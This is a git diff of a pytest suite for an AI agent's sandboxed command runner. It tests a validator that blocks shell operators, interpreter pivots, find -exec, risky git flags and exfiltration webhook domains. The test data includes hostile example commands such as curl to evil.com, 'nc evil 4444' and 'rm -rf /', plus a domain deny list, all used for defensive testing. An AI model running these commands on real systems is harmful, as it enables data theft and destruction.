@@ -3,9 +3,11 @@
 import contextlib
 import inspect
 import json
+import os
 import shlex
 import tempfile
 from pathlib import Path
+from typing import Any
 from unittest.mock import AsyncMock, MagicMock, patch
 
 import pytest
@@ -13,10 +15,13 @@ from google.antigravity import LocalAgentConfig
 
 from dependency_director.config import DEFAULT_SRT_SETTINGS_PATH
 from dependency_director.tools import (
+    CommandResult,
+    SandboxedCommandRunner,
     create_run_command_tool,
     is_ripgrep_available,
     is_srt_available,
-    validate_sandboxed_command,
+    split_compound_argv,
+    validate_argv,
 )
 
 from .conftest import AsyncFSHelper
@@ -59,7 +64,7 @@ async def test_sandbox_filesystem_write_restricted(tmp_path: Path, async_fs: typ
     if await async_fs.exists(unauthorized_file):
         with contextlib.suppress(Exception):
             await async_fs.unlink(unauthorized_file)
-    cmd = f"echo 'evil payload' > {unauthorized_file}"
+    cmd = f"python3 -c \"open('{unauthorized_file}','w').write('evil payload\\n')\""
     output = await run_command(cmd)
     try:
         exists = await async_fs.exists(unauthorized_file)
@@ -90,7 +95,7 @@ async def test_sandbox_workspace_write_allowed(tmp_path: Path, async_fs: type[As
     await async_fs.mkdir(workspace)
     run_command = create_run_command_tool(workspace)
     target_file = str(Path(workspace) / "valid_patch.txt")
-    cmd = f"echo 'valid patch content' > {target_file}"
+    cmd = f"python3 -c \"open('{target_file}','w').write('valid patch content\\n')\""
     output = await run_command(cmd)
     assert "Permission denied" not in output
     assert "Operation not permitted" not in output
@@ -131,7 +136,7 @@ async def test_sandbox_git_metadata_write_denied(tmp_path: Path, async_fs: type[
     await async_fs.mkdir(hooks_dir)
     run_command = create_run_command_tool(workspace)
     hook_file = str(Path(hooks_dir) / "post-commit")
-    cmd = f"echo 'evil' > {hook_file}"
+    cmd = f"python3 -c \"open('{hook_file}','w').write('evil\\n')\""
     output = await run_command(cmd)
     assert any(
         msg in output
@@ -155,7 +160,7 @@ async def test_sandbox_git_metadata_write_config_allowed(tmp_path: Path, async_f
     await async_fs.mkdir(git_dir)
     run_command = create_run_command_tool(workspace)
     config_file = str(Path(git_dir) / "config")
-    cmd = f"echo 'evil-config' > {config_file}"
+    cmd = f"python3 -c \"open('{config_file}','w').write('evil-config\\n')\""
     output = await run_command(cmd)
     assert any(
         msg in output
@@ -180,17 +185,17 @@ async def test_sandbox_git_metadata_write_config_allowed(tmp_path: Path, async_f
 @requires_srt
 @pytest.mark.asyncio
 async def test_sandbox_git_metadata_write_compound_command(tmp_path: Path, async_fs: type[AsyncFSHelper]) -> None:
-    """Verify that direct writes to git metadata inside compound commands are blocked."""
+    """Verify that compound commands (&&) execute both sub-commands through srt."""
     workspace = str(tmp_path / "workspace")
     await async_fs.mkdir(workspace)
     git_dir = str(Path(workspace) / ".git")
     await async_fs.mkdir(git_dir)
     config_file = str(Path(git_dir) / "config")
     run_command = create_run_command_tool(workspace)
+    # Compound commands are now supported — both sub-commands execute
     cmd = "echo 'initiating...' && git init"
     output = await run_command(cmd)
-    assert "Operation not permitted" not in output
-    assert "Permission denied" not in output
+    assert "Shell operators" not in output
     assert await async_fs.exists(config_file)
 
 
@@ -205,7 +210,7 @@ async def test_sandbox_git_other_metadata_write_allowed(tmp_path: Path, async_fs
     await async_fs.mkdir(refs_dir)
     run_command = create_run_command_tool(workspace)
     ref_file = str(Path(refs_dir) / "main")
-    cmd = f"echo 'commit_hash' > {ref_file}"
+    cmd = f"python3 -c \"open('{ref_file}','w').write('commit_hash\\n')\""
     output = await run_command(cmd)
     assert "Permission denied" not in output
     assert "Operation not permitted" not in output
@@ -422,7 +427,13 @@ async def test_sandbox_developer_loop_dependency_upgrade(tmp_path: Path, async_f
     assert "def add(*, x, y):" in output_read
     patch_code = "import sys\nsys.path.insert(0, '.')\nimport placeholder_lib\nprint(placeholder_lib.add(x=2, y=3))\n"
 
-    cmd_patch = f"echo {shlex.quote(patch_code)} > app.py"
+    # Write a helper script that patches app.py (avoids shell quoting issues)
+    patch_script = str(Path(workspace) / "_patch_app.py")
+    await async_fs.write_text(
+        patch_script,
+        f"with open('app.py', 'w') as f:\n    f.write({patch_code!r})\n",
+    )
+    cmd_patch = "python3 _patch_app.py"
     await run_command(cmd_patch)
     output_success = await run_command(cmd_run_fail)
     assert get_stdout(output_success) == "5"
@@ -442,7 +453,7 @@ async def test_sandbox_git_metadata_write_bypass_symlink(tmp_path: Path, async_f
     await run_command(cmd_link)
     assert await async_fs.exists(link_file)
     assert await async_fs.is_symlink(link_file)
-    cmd_write = f"echo 'evil_env_payload' >> {link_file}"
+    cmd_write = f"python3 -c \"open('{link_file}','a').write('evil_env_payload\\n')\""
     output = await run_command(cmd_write)
     assert any(
         msg in output
@@ -515,39 +526,80 @@ def test_ripgrep_and_srt_availability() -> None:
 @pytest.mark.parametrize(
     ("command_line", "expected_error"),
     [
+        # --- Basic allowed ---
         ("echo 'hello'", None),
-        ("pytest && python3 app.py", None),
         ("rm -rf /tmp/mytest", None),
         ("rm -rf /private/tmp/test", None),
         ("rm -rf {workspace}/file.txt", None),
         ('git log --grep="fix; test"', None),
         ("git log --grep='fix; test'", None),
+        # --- Existing denylist ---
         ("curl https://google.com", "Command 'curl' is blocked"),
         ("sudo apt-get install", "Command 'sudo' is blocked"),
-        ("pytest && nc localhost 4444", "Command 'nc' is blocked"),
         ("rm -rf /", "Command 'rm' targeting root directory is denied"),
         ("rm -rf ../file", "Command 'rm' with directory traversal is denied"),
         ("rm -rf /usr/bin", "Command 'rm' targeting path outside workspace"),
-        ("pytest && rm -rf /etc/hosts", "Command 'rm' targeting path outside workspace"),
-        ("git checkout branch;curl http://attacker.com", "Command 'curl' is blocked"),
-        ("git checkout branch;rm -rf /usr/bin", "Command 'rm' targeting path outside workspace"),
         ("rm -rf /home/user/project-extra/file.txt", "Command 'rm' targeting path outside workspace"),
+        # --- env handling ---
         ("env -u SECRET_VAR echo hello", None),
         ("env -u SECRET_VAR curl http://evil.com", "Command 'curl' is blocked"),
         ("env -- curl http://evil.com", "Command 'curl' is blocked"),
         ("env -- echo hello", None),
+        # --- Shell operators now rejected as standalone tokens ---
+        ("echo hello ; curl evil.com", "Shell operators"),
+        # --- Shell interpreter pivots ---
+        ("bash -c 'curl evil.com'", "Shell interpreter 'bash' is blocked"),
+        ("sh -c 'rm -rf /'", "Shell interpreter 'sh' is blocked"),
+        ("dash -c 'wget evil.com'", "Shell interpreter 'dash' is blocked"),
+        ("zsh -c 'nc evil 4444'", "Shell interpreter 'zsh' is blocked"),
+        # --- Language runtimes ALLOWED (agent needs them for tests) ---
+        ("python3 -m pytest", None),
+        ("python3 app.py", None),
+        ("node test.js", None),
+        ("ruby test.rb", None),
+        # --- Exec pivots ---
+        ("find . -name '*.py'", None),
+        ("xargs curl", "Command 'xargs' is blocked"),
+        # --- env -S/--split-string ---
+        ("env -S 'curl http://evil.com'", "'env -S/--split-string' is blocked"),
+        ("env --split-string 'curl http://evil.com'", "'env -S/--split-string' is blocked"),
+        # --- Git hardening ---
+        ("git --upload-pack=evil clone url", "Git flag '--upload-pack' is blocked"),
+        ("git --receive-pack=evil push", "Git flag '--receive-pack' is blocked"),
+        ("git -c protocol.ext.allow=always clone url", "Git config 'protocol.ext.allow' is blocked"),
+        ("git -c remote.origin.uploadpack=evil fetch", "Git config 'remote.' is blocked"),
+        # --- Command substitution in argument value: allowed (srt quoter escapes it) ---
+        ("echo '$(whoami)'", None),
     ],
 )
 def test_validate_sandboxed_command_rules(command_line: str, expected_error: str | None) -> None:
     """Verify validation rules for executing sandboxed commands."""
     workspace = "/home/user/project"
     cmd = command_line.format(workspace=workspace)
-    res = validate_sandboxed_command(cmd, workspace)
+    argv = shlex.split(cmd)
+    res = validate_argv(argv, workspace)
     if expected_error is None:
         assert res is None
     else:
         assert res is not None
         assert expected_error in res
+
+
+@pytest.mark.parametrize(
+    ("argv", "expected_error"),
+    [
+        (["find", ".", "-exec", "curl", "{}", "+"], "'find' with '-exec' is blocked"),
+        (["find", ".", "-execdir", "rm", "{}", "+"], "'find' with '-execdir' is blocked"),
+        (["find", ".", "-ok", "rm", "{}", "+"], "'find' with '-ok' is blocked"),
+        # With ; terminator: the operator check catches it first (also blocked)
+        (["find", ".", "-exec", "curl", "{}", ";"], "Shell operators"),
+    ],
+)
+def test_validate_argv_exec_pivots(argv: list[str], expected_error: str) -> None:
+    """Verify find -exec/-execdir/-ok pivots are blocked."""
+    res = validate_argv(argv, "/tmp")
+    assert res is not None
+    assert expected_error in res
 
 
 @pytest.mark.asyncio
@@ -629,7 +681,7 @@ async def test_sandbox_git_credential_env_overrides(
     github_token: str,
     async_fs: type[AsyncFSHelper],
 ) -> None:
-    """Verify git credential environment variables are passed to sandbox."""
+    """Verify git credential environment variables are passed to sandbox for git commands."""
     workspace = str(tmp_path / "workspace")
     await async_fs.mkdir(workspace)
     settings_file = tmp_path / "settings.json"
@@ -639,7 +691,7 @@ async def test_sandbox_git_credential_env_overrides(
     mock_process.communicate.return_value = (b"", b"")
     mock_process.returncode = 0
     with patch("asyncio.create_subprocess_exec", return_value=mock_process) as mock_exec:
-        await run_command("echo hello")
+        await run_command("git status")
         mock_exec.assert_called_once()
         kwargs = mock_exec.call_args.kwargs
         env = kwargs.get("env", {})
@@ -691,7 +743,7 @@ def test_create_run_command_tool_rejects_no_sandbox_param() -> None:
 
 @pytest.mark.asyncio
 async def test_run_command_always_uses_exec_not_shell(tmp_path: Path, async_fs: type[AsyncFSHelper]) -> None:
-    """The tool must always use subprocess_exec (with srt), never subprocess_shell."""
+    """The tool must always use subprocess_exec (with srt) in argv mode, never subprocess_shell."""
     workspace = str(tmp_path / "workspace")
     await async_fs.mkdir(workspace)
     settings_file = tmp_path / "settings.json"
@@ -707,6 +759,14 @@ async def test_run_command_always_uses_exec_not_shell(tmp_path: Path, async_fs: 
         await run_command("echo test")
         mock_exec.assert_called_once()
         mock_shell.assert_not_called()
+        # Verify srt is invoked in argv mode (-- separator, not -c)
+        call_args = mock_exec.call_args[0]
+        assert call_args[0] == "srt"
+        assert "--" in call_args, "srt must be invoked with -- separator for argv mode"
+        separator_idx = list(call_args).index("--")
+        argv_portion = call_args[separator_idx + 1 :]
+        assert argv_portion == ("echo", "test"), f"Unexpected argv: {argv_portion}"
+        assert "-c" not in call_args, "srt must NOT use -c (shell string mode)"
 
 
 def test_validate_sandboxed_command_git_config() -> None:
@@ -714,7 +774,7 @@ def test_validate_sandboxed_command_git_config() -> None:
     temp_dir = tempfile.gettempdir()
 
     def assert_blocked(cmd: str) -> None:
-        res = validate_sandboxed_command(cmd, temp_dir)
+        res = validate_argv(shlex.split(cmd), temp_dir)
         assert res is not None
         assert "Security Error" in res
 
@@ -742,10 +802,10 @@ def test_validate_sandboxed_command_git_config() -> None:
     assert_blocked("git --config-env core.sshcommand=ENV_VAR clone")
     assert_blocked("git --git-dir=/tmp/evil-git-dir status")
     assert_blocked("git --git-dir /tmp/evil-git-dir status")
-    assert validate_sandboxed_command("git config core.repositoryformatversion", temp_dir) is None
-    assert validate_sandboxed_command("git config -f .git/config core.repositoryformatversion", temp_dir) is None
-    assert validate_sandboxed_command("git clone https://github.com/my-url.dot/repo", temp_dir) is None
-    assert validate_sandboxed_command("git status", temp_dir) is None
+    assert validate_argv(shlex.split("git config core.repositoryformatversion"), temp_dir) is None
+    assert validate_argv(shlex.split("git config -f .git/config core.repositoryformatversion"), temp_dir) is None
+    assert validate_argv(shlex.split("git clone https://github.com/my-url.dot/repo"), temp_dir) is None
+    assert validate_argv(shlex.split("git status"), temp_dir) is None
 
 
 @pytest.mark.asyncio
@@ -769,3 +829,216 @@ async def test_create_run_command_tool_agent_registration(tmp_path: Path, async_
     # Entering the Agent context requires a live Gemini API key, so we only
     # verify construction here — proto conversion happens at config build time.
     assert run_command in config.tools
+
+
+@pytest.mark.asyncio
+async def test_sandbox_non_git_command_has_no_token_env(
+    tmp_path: Path,
+    github_token: str,
+    async_fs: type[AsyncFSHelper],
+) -> None:
+    """Non-git commands must NOT have GitHub token env vars (exfiltration defense)."""
+    workspace = str(tmp_path / "workspace")
+    await async_fs.mkdir(workspace)
+    settings_file = tmp_path / "settings.json"
+    settings_file.write_text('{"filesystem": {}}')
+    run_command = create_run_command_tool(workspace, srt_settings_path=str(settings_file), github_token=github_token)
+    mock_process = AsyncMock()
+    mock_process.communicate.return_value = (b"", b"")
+    mock_process.returncode = 0
+    with patch("asyncio.create_subprocess_exec", return_value=mock_process) as mock_exec:
+        await run_command("echo hello")
+        mock_exec.assert_called_once()
+        kwargs = mock_exec.call_args.kwargs
+        env = kwargs.get("env", {})
+        token_env_keys = {
+            "GIT_CONFIG_COUNT",
+            "GIT_CONFIG_KEY_0",
+            "GIT_CONFIG_VALUE_0",
+            "GIT_CONFIG_KEY_1",
+            "GIT_CONFIG_VALUE_1",
+            "GIT_TERMINAL_PROMPT",
+        }
+        leaked = token_env_keys & set(env)
+        assert not leaked, f"Token env vars leaked to non-git command: {leaked}"
+
+
+def test_srt_settings_policy_assertions() -> None:
+    """Verify srt-settings.json enforces critical sandbox policies."""
+    with Path(DEFAULT_SRT_SETTINGS_PATH).open() as f:
+        config = json.load(f)
+
+    # Network isolation must NOT be weakened
+    assert config.get("enableWeakerNetworkIsolation") is not True, "enableWeakerNetworkIsolation must be false/absent"
+
+    # Home directory must be denied for reads
+    deny_read = config.get("filesystem", {}).get("denyRead", [])
+    assert "~" in deny_read, "filesystem.denyRead must include '~'"
+
+    # Exfil webhook domains must be denied
+    denied_domains = config.get("network", {}).get("deniedDomains", [])
+    expected_exfil_patterns = ["*.ngrok.io", "*.pipedream.com", "*.webhook.site", "*.requestbin.com"]
+    for pattern in expected_exfil_patterns:
+        assert pattern in denied_domains, f"network.deniedDomains missing exfil pattern: {pattern}"
+
+
+# --- Compound && / || support (TDD) ---
+
+
+@pytest.mark.parametrize(
+    ("argv", "expected"),
+    [
+        # No operators — single command passthrough
+        (["git", "status"], [["git", "status"]]),
+        # Single &&
+        (
+            ["git", "config", "user.email", "x", "&&", "git", "config", "user.name", "y"],
+            [["git", "config", "user.email", "x"], ["git", "config", "user.name", "y"]],
+        ),
+        # Multiple &&
+        (
+            ["cmd1", "&&", "cmd2", "arg", "&&", "cmd3"],
+            [["cmd1"], ["cmd2", "arg"], ["cmd3"]],
+        ),
+        # || operator
+        (
+            ["cmd1", "||", "cmd2"],
+            [["cmd1"], ["cmd2"]],
+        ),
+        # Mixed && and ||
+        (
+            ["cmd1", "&&", "cmd2", "||", "cmd3"],
+            [["cmd1"], ["cmd2"], ["cmd3"]],
+        ),
+    ],
+)
+def test_split_compound_argv(argv: list[str], expected: list[list[str]]) -> None:
+    """split_compound_argv correctly splits argv on && and || tokens."""
+    parts = split_compound_argv(argv)
+    # Extract just the argv lists (ignoring operators)
+    assert [p.argv for p in parts] == expected
+
+
+def test_split_compound_argv_preserves_operators() -> None:
+    """split_compound_argv records which operator joins each sub-command."""
+    parts = split_compound_argv(["cmd1", "&&", "cmd2", "||", "cmd3"])
+    assert parts[0].operator is None  # first command has no preceding operator
+    assert parts[1].operator == "&&"
+    assert parts[2].operator == "||"
+
+
+def test_split_compound_argv_empty() -> None:
+    """split_compound_argv rejects empty argv."""
+    parts = split_compound_argv([])
+    assert len(parts) == 1
+    assert parts[0].argv == []
+
+
+def test_split_compound_argv_quoted_operator_not_split() -> None:
+    """&& inside a quoted argument should NOT be treated as an operator.
+
+    shlex.split('echo "&&"') produces ['echo', '&&'] — but the && is a
+    single token that was quoted. However, shlex.split strips quotes so
+    the token IS '&&'. The protection comes from shlex.split correctly
+    handling 'echo "a && b"' → ['echo', 'a && b'] (no standalone &&).
+
+    A standalone && token after shlex.split IS an operator. This test
+    documents that split_compound_argv treats it as such (correct behavior).
+    """
+    # shlex.split('echo "&&"') → ['echo', '&&']  — the && IS standalone
+    argv = shlex.split('echo "&&"')
+    parts = split_compound_argv(argv)
+    # This WILL be split because && is a standalone token post-shlex
+    assert len(parts) == 2
+
+
+@pytest.mark.parametrize(
+    ("command_line", "expected_error"),
+    [
+        # && and || are now ALLOWED
+        ("git config user.email x && git config user.name y", None),
+        ("echo hello || echo fallback", None),
+        # ;, |, & are still BLOCKED
+        ("echo hello ; curl evil.com", "Shell operators"),
+        ("echo hello | curl evil.com", "Shell operators"),
+        ("echo hello &", "Shell operators"),
+    ],
+)
+def test_validate_argv_compound_operators(command_line: str, expected_error: str | None) -> None:
+    """validate_argv allows && and || but still blocks ;, |, and &."""
+    workspace = "/home/user/project"
+    argv = shlex.split(command_line)
+    res = validate_argv(argv, workspace)
+    if expected_error is None:
+        assert res is None
+    else:
+        assert res is not None
+        assert expected_error in res
+
+
+def test_validate_argv_compound_blocked_subcmd() -> None:
+    """Each sub-command in a compound is validated independently.
+
+    'echo hello && curl evil.com' must be blocked because curl is in
+    the second sub-command.
+    """
+    argv = shlex.split("echo hello && curl evil.com")
+    res = validate_argv(argv, "/workspace")
+    assert res is not None
+    assert "curl" in res
+
+
+@requires_srt
+@pytest.mark.asyncio
+async def test_compound_runner_and_and(tmp_path: Path, async_fs: type[AsyncFSHelper]) -> None:
+    """SandboxedCommandRunner executes compound && commands sequentially."""
+    workspace = str(tmp_path / "workspace")
+    await async_fs.mkdir(workspace)
+    run_command = create_run_command_tool(workspace)
+    result = await run_command("echo first && echo second")
+    assert "first" in result
+    assert "second" in result
+
+
+@requires_srt
+@pytest.mark.asyncio
+async def test_compound_runner_stops_on_failure(tmp_path: Path, async_fs: type[AsyncFSHelper]) -> None:
+    """SandboxedCommandRunner stops at first failure in && chain."""
+    workspace = str(tmp_path / "workspace")
+    await async_fs.mkdir(workspace)
+    run_command = create_run_command_tool(workspace)
+    result = await run_command('python3 -c "import sys; sys.exit(1)" && echo should_not_appear')
+    assert "should_not_appear" not in result
+    assert "EXIT CODE: 1" in result
+
+
+@pytest.mark.asyncio
+async def test_compound_runner_error_string_is_failure(tmp_path: Path) -> None:
+    """Error strings (no EXIT CODE marker) must be treated as failure in && chains.
+
+    _run_single_argv can return strings like "Error: Command timed out..." or
+    "Error: Failed to create temporary config..." that lack an EXIT CODE marker.
+    These must short-circuit && chains, not be treated as success.
+    """
+    call_count = 0
+    call_args: list[list[str]] = []
+
+    async def mock_run(_self: Any, argv: list[str], _cwd: str) -> CommandResult:
+        nonlocal call_count
+        call_count += 1
+        call_args.append(argv)
+        if call_count == 1:
+            return CommandResult("Error: Command timed out after 300 seconds.", -1)
+        return CommandResult("--- STDOUT ---\nsecond\n--- EXIT CODE: 0 ---", 0)
+
+    workspace = str(tmp_path / "workspace")
+    os.makedirs(workspace)
+
+    with patch.object(SandboxedCommandRunner, "_run_single_argv", mock_run):
+        run_command = create_run_command_tool(workspace)
+        result = await run_command("echo first && echo second")
+
+    assert "Error: Command timed out" in result
+    assert "echo second" not in result  # second command output must not appear
+    assert call_count == 1  # second command was never called
+    assert call_args == [["echo", "first"]]
